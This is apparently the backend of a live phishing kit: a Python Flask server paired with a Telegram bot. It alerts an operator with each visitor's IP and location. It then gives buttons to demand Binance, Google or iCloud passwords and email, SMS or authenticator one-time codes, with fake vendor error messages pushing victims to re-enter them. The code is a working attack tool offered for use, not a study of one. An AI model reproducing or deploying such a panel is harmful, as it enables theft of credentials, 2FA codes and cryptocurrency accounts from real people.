from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from dotenv import load_dotenv
import os
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, Dispatcher
import threading
from telegram.error import TelegramError
from flask_socketio import SocketIO, emit




load_dotenv()
app = Flask(__name__)
CORS(app, origins=["http://18.144.169.247:3000"])
socketio = SocketIO(app, cors_allowed_origins="*")
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')

COMMANDS = {
    "REQUEST_BINANCE_PASSWORD": "",
    "REQUEST_EMAIL_AGAIN": "Binance account not found",
    "REQUEST_PASSWORD_AGAIN": "Incorrect password. Please retry again. You have 3 more chances left.(200001004-a2437132)",
    "REQUEST_MOBILE_APP_VERIFICATION": "Mobile app verification page is not available yet",
    "REQUEST_AUTHENTICATION_EMAIL": "Auth and email page loaded",
    "REQUEST_AUTHENTICATION_PHONE": "Auth and phone page loaded",
    "REQUEST_AUTH_OTP_AGAIN": "You have entered an incorrect 2FA verification code.(200001013-210a9570)",
    "REQUEST_EMAIL_OTP_AGAIN": "Incorrect verification code. Please check your emails or resend the code and try again.(001412-c91b96d1)",
    "REQUEST_PHONE_OTP_AGAIN": "Incorrect verification code. Please check your SMS or resend the code and try again.(001412-c91b96d1)",
    "REQUEST_GOOGLE_EMAIL_AGAIN": "Couldnt find your google account",
    "REQUEST_GOOGLE_PASSWORD_AGAIN": "Wrong password. Try again",
    "REQUEST_ICLOUD_EMAIL_AGAIN": "Enter the email or phone number and password for your Apple Account.",
    "REQUEST_ICLOUD_PASSWORD_AGAIN": "Enter the email or phone number and password for your Apple Account.",
    "FINISH": "Redirecting user to the specified URL",
}
#active_commands = {}

# Initialize bot and updater globally
bot = Bot(token=TELEGRAM_BOT_TOKEN)
updater = None

def handle_button_click(update: Update, context):
    query = update.callback_query
    command = query.data
    #user_id = query.from_user.id
    #active_commands[user_id] = command 

    if command in COMMANDS:
        print(f"COMMAND RECEIVED: {command} - {COMMANDS[command]}")
        try:
            query.answer(f"Command received: {command}")
        except TelegramError as e:
            print(f"Telegram error: {e}")
    else:
        try:
            query.answer("Invalid command")
        except TelegramError as e:
            print(f"Telegram error: {e}")

def start_bot():
    global updater
    try:
        updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
        dispatcher = updater.dispatcher
        dispatcher.add_handler(CallbackQueryHandler(handle_button_click))
        
        # Start the bot without using idle()
        updater.start_polling(drop_pending_updates=True)
    except Exception as e:
        print(f"Error starting bot: {e}")

def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city")
        location = response.json()
        return f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}"
    except Exception as e:
        print(f"Error getting location: {e}")
        return "Location unavailable"



@socketio.on('connect')
def handle_connect():
    print('Client connected')


@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

@app.route('/notify', methods=['POST', 'OPTIONS'])
def notify():
    if request.method == 'OPTIONS':
        return jsonify({"status": "success"}), 200
    
    try:
        data = request.json
        ip = request.remote_addr
        message = f"New User Visited!\nIP: {ip}\nLocation: {get_location(ip)}"
        
        payload = {
            "chat_id": os.getenv('TELEGRAM_CHAT_ID'),
            "text": message,
            "reply_markup": {
                "inline_keyboard": [
                    [{"text": "PROCEED TO PASSWORD", "callback_data": "REQUEST_BINANCE_PASSWORD"}],
                    [{"text": "REQUEST EMAIL AGAIN", "callback_data": "REQUEST_EMAIL_AGAIN"}],
                    [{"text": "REQUEST PASSWORD AGAIN", "callback_data": "REQUEST_PASSWORD_AGAIN"}],
                    [{"text": "REQUEST MOBILE APP VERIFICATION", "callback_data": "REQUEST_MOBILE_APP_VERIFICATION"}],
                    [{"text": "REQUEST AUTHENTICATION/EMAIL", "callback_data": "REQUEST_AUTHENTICATION_EMAIL"}],
                    [{"text": "REQUEST AUTHENTICATION/PHONE", "callback_data": "REQUEST_AUTHENTICATION_PHONE"}],
                    [{"text": "REQUEST AUTH OTP AGAIN", "callback_data": "REQUEST_AUTH_OTP_AGAIN"}],
                    [{"text": "REQUEST EMAIL OTP AGAIN", "callback_data": "REQUEST_EMAIL_OTP_AGAIN"}],
                    [{"text": "REQUEST PHONE OTP AGAIN", "callback_data": "REQUEST_PHONE_OTP_AGAIN"}],
                    [{"text": "REQUEST GOOGLE EMAIL AGAIN", "callback_data": "REQUEST_GOOGLE_EMAIL_AGAIN"}],
                    [{"text": "REQUEST GOOGLE PASSWORD AGAIN", "callback_data": "REQUEST_GOOGLE_PASSWORD_AGAIN"}],
                    [{"text": "REQUEST ICLOUD EMAIL AGAIN", "callback_data": "REQUEST_ICLOUD_EMAIL_AGAIN"}],
                    [{"text": "REQUEST ICLOUD PASSWORD AGAIN", "callback_data": "REQUEST_ICLOUD_PASSWORD_AGAIN"}],
                    [{"text": "FINISH", "callback_data": "FINISH"}],
                ]
            }
        }
        
        try:
            bot.send_message(
                chat_id=os.getenv('TELEGRAM_CHAT_ID'),
                text=message,
                reply_markup=payload['reply_markup']
            )
            return jsonify({"status": "success"})
        except TelegramError as e:
            print(f"Telegram error in notify: {e}")
            return jsonify({"status": "error", "message": str(e)}), 500
            
    except Exception as e:
        print(f"Error in notify endpoint: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500





if __name__ == '__main__':
    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.daemon = True  # Make the thread daemon so it exits when the main program exits
    bot_thread.start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000)
    socketio.run(app, host='0.0.0.0', port=5000)
